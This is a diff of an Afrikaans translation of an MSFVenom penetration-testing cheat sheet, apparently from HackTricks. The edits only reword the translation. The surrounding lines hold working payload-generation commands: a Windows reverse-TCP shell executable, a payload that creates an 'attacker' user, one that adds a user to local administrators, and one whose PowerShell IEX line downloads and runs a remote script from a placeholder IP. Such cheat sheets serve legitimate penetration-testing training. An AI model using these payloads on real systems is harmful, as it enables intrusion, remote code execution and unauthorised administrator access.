@@ -1,19 +1,21 @@
 # MSFVenom - CheatSheet
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ---
 
 ## Basiese msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Gebruik `-a` om die payload-argitektuur te kies en `--platform` om sy teikenplatform te kies.<sup>[[1]](#references)</sup>
+Gebruik `-a` om die payload-argitektuur te kies en `--platform` om die teikenplatform te kies.<sup>[[1]](#references)</sup>
 
 ## Lys
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-Hierdie opdragte lys die payload- en encoder-modules wat in die geïnstalleerde framework beskikbaar is.<sup>[[1]](#references)</sup>
+Hierdie commands lys die payload- en encoder-modules wat in die geïnstalleerde framework beskikbaar is.<sup>[[1]](#references)</sup>
 
 ## Algemene parameters wanneer shellcode geskep word
 ```bash
@@ -23,7 +25,7 @@ Hierdie opdragte lys die payload- en encoder-modules wat in die geïnstalleerde 
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-Die flags wat hier gewys word, kies bad characters, output format, encoder en encoding iterations.<sup>[[1]](#references)</sup>
+Die vlae wat hier getoon word, kies ongeldige karakters, uitvoerformaat, encoder en enkoderingsiterasies.<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -43,7 +45,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Voer opdrag uit**
+### **Voer Command uit**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
